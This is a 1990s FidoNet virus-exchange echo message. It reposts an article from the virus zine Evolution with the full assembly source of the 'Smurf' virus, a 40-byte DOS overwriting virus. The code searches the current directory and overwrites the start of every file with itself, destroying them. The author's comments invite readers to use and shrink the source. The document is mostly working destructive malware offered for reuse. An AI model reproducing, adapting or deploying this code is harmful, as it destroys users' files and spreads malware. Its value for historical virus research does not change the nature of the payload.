;Ä PVT.VIRII (2:465/65.4) ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ PVT.VIRII Ä
; Msg  : 1 of 55
; From : MeteO                               2:5030/136      Tue 09 Nov 93 09:10
; To   : -  *.*  -                                           Fri 11 Nov 94 08:10
; Subj : OW_40.ASM
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;.RealName: Max Ivanov
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;* Kicked-up by MeteO (2:5030/136)
;* Area : VIRUS (Int: ˆ­ä®p¬ æ¨ï ® ¢¨pãá å)
;* From : Ron Toler, 2:283/718 (06 Nov 94 16:13)
;* To   : Doug Bryce
;* Subj : OW_40.ASM
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;@RFC-Path:
;ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
;18.n283!not-for-mail
;@RFC-Return-Receipt-To: Ron.Toler@f718.n283.z2.fidonet.org
;ÄÄÄÄÄÄÄÄÄÍÍÍÍÍÍÍÍÍ>>> Article From Evolution #2 - YAM '92
;
;Article Title: The Smurf Virus
;Author: Admiral Bailey


;---
; The Smurf virus [40 Bytes Long]
;
; Author   : Admiral Bailey [YAM '92]
; Date     : June 6 1992
; Language : Assembly [TASM 2.0]
;
; Notes:The Smurf virus was my first attempt at writing the smallest
;       overwriting virus known.  For a first attempt it wasn't that
;       bad. So far I have got it down to 40 bytes.  The record that
;       does the same as this is about 38 bytes.  So I gotta loose 2
;       bytes in here somewhere.  Well seeing as this small thing is
;       probably the easiest virus in the world to disassemble, I have
;       included the source in this issue of Evolution for all of you
;       to take a look at.  The source is for you to use.  If you
;       happend to make anything smaller using this source please just
;       give recognition to myself, Admiral Bailey, saying that you got
;       help looking at this source.  The only thing that this does is
;       find everyfile in the current directory and overwrite the 1st
;       40 bytes with itself.  Then locks your computer while it is in
;       a search loop looking for more file when there are none.  A
;       neat thing about this is that it displays its entire self to
;       the screen when executed.  Scan 91 notices this as the mini
;       virus but I dont blame it seeing that you cant realy avoid
;       scan when your virus gets this small. Well enjoy the source...
;       and remember if you use it and enjoy it just let me know.
;---
code    segment
        assume  ds:code, ss:code, cs:code, es:code
        org     100h                    ;Make it a .com file

virus_start     equ     $

start:
        mov     dx,offset file_type     ;type of file to look for
        mov     ah,4eh                  ;Find first file command

infect:
        int     21h
        mov     ax,3d02h                ;open again to reset handle
        mov     dx,80h+1eh              ;moves filename into dx
        int     21h
        mov     bx,ax                   ;save handle again
        mov     cx,virus_length         ;put size of virus in cx
        mov     dx,100h                 ;where the code starts
        mov     ah,40h                  ;write to handle command
        int     21h                     ;write virus into file
        mov     ah,3eh                  ;close handle service
        int     21h                     ;do it

find_next_file:
        mov     ah,4fh                  ;find next file command
        jmp     infect

file_type       db      '*.*',0
virus_end       equ     $
virus_length    =       virus_end - virus_start ;length of virus

code    ends

        end     start

;-+-  GoldED 2.50.B1016+
; + Origin: Poeldijk, The Netherlands, Europe, Earth (2:283/718)
;=============================================================================
;
;Yoo-hooo-oo, -!
;
;
;    þ The MeÂeO
;
;/yx           Extended memory swapping
;
;--- Aidstest Null: /Kill
; * Origin: ùPVT.ViRIIúmainúboardú / Virus Research labs. (2:5030/136)

